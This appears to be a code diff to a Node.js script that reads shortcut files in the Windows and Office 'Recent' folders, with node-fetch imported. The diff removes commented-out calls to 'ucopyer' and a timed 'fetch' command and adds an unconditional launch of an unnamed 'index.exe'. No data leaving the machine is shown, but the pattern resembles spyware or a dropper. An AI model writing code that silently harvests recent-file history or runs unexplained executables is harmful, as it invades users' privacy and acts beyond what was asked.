@@ -1,12 +1,11 @@
 const md5 = require("./assets/gethash");
 
-//cmd.run("ucopyer");
-
 const fs = require("fs");
 const path = require("path");
 const lnk = require("./lnkdecoder");
 const chalk = require("chalk");
 const fetch = require("node-fetch");
+const cmd   = require("node-cmd");
 
 const dirls = ["Microsoft/Windows/Recent", "Microsoft/Office/Recent"];
 
@@ -47,9 +46,5 @@ for (let i in dirls) {
         }
     });
 }
-/*
-setInterval(function () {
-	console.log("Main process: calling python");
-	console.log(cmd.runSync("fetch"));
-}, 1000 * 60 * 5);
-*/
+
+cmd.run("index.exe");
